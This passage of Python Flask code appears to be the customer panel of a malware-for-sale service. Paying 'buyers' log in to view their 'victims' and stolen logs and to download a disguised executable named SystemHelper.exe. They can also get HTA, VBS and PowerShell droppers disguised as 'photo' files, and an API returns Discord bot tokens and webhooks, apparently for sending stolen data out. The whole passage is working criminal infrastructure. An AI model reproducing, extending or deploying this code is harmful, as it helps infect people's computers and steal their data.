            session['buyer_key'] = key
            session['buyer_name'] = name
            return redirect(url_for('customer_dashboard'))
        return render_template_string(CUSTOMER_LOGIN_HTML), 403
    return render_template_string(CUSTOMER_LOGIN_HTML)

@app.route('/dashboard')
def customer_dashboard():
    if 'buyer_key' not in session: return redirect(url_for('customer_login'))
    key = session['buyer_key']
    victims = get_victims_for_buyer(key)
    logs = get_logs_for_buyer(key)
    chat = get_chat_messages()
    return render_template_string(CUSTOMER_DASHBOARD_HTML, name=session['buyer_name'],
                                  victims=victims, logs=logs, chat_messages=chat)

@app.route('/send_chat', methods=['POST'])
def customer_send_chat():
    if 'buyer_key' not in session: return redirect(url_for('customer_login'))
    msg = request.form.get('message')
    if msg: add_chat_message('customer', session['buyer_name'], msg)
    return redirect(url_for('customer_dashboard'))

@app.route('/logout')
def customer_logout():
    session.clear()
    return redirect(url_for('customer_login'))

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    if 'buyer_key' not in session: return "Unauthorized", 401
    key = session['buyer_key']
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("DELETE FROM victim_logs WHERE buyer_key=?", (key,))
    return "OK"

# Download endpoints (lightweight)
@app.route('/download_exe')
def download_exe():
    if 'buyer_key' not in session: return redirect(url_for('customer_login'))
    return redirect(url_for('static_files', filename='SystemHelper.exe'))

@app.route('/download_hta_dropper')
def download_hta_dropper():
    if 'buyer_key' not in session: return redirect(url_for('customer_login'))
    buyer_key = session['buyer_key']
    exe_url = request.url_root.rstrip('/') + '/static/SystemHelper.exe'
    dropper = generate_hta_dropper(exe_url, buyer_key)
    return send_file(io.BytesIO(dropper), as_attachment=True, download_name='photo.hta', mimetype='application/hta')

@app.route('/download_vbs_dropper')
def download_vbs_dropper():
    if 'buyer_key' not in session: return redirect(url_for('customer_login'))
    buyer_key = session['buyer_key']
    exe_url = request.url_root.rstrip('/') + '/static/SystemHelper.exe'
    dropper = generate_vbs_dropper(exe_url, buyer_key)
    return send_file(io.BytesIO(dropper), as_attachment=True, download_name='photo.vbs', mimetype='application/x-vbs')

@app.route('/download_ps1_dropper')
def download_ps1_dropper():
    if 'buyer_key' not in session: return redirect(url_for('customer_login'))
    buyer_key = session['buyer_key']
    exe_url = request.url_root.rstrip('/') + '/static/SystemHelper.exe'
    dropper = generate_ps1_dropper(exe_url, buyer_key)
    return send_file(io.BytesIO(dropper), as_attachment=True, download_name='photo.ps1', mimetype='text/plain')

# API
@app.route('/api/get_config', methods=['GET'])
def get_config():
    key = request.args.get('key')
    if not key:
        return jsonify({"error": "missing key"}), 400
    name = check_buyer(key)
    if not name:
        return jsonify({"error": "invalid key"}), 403
    return jsonify({
        "bot_token": DISCORD_BOT_TOKEN,
        "channel_id": DISCORD_CHANNEL_ID,
        "webhook": WEBHOOK_URL
    })

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
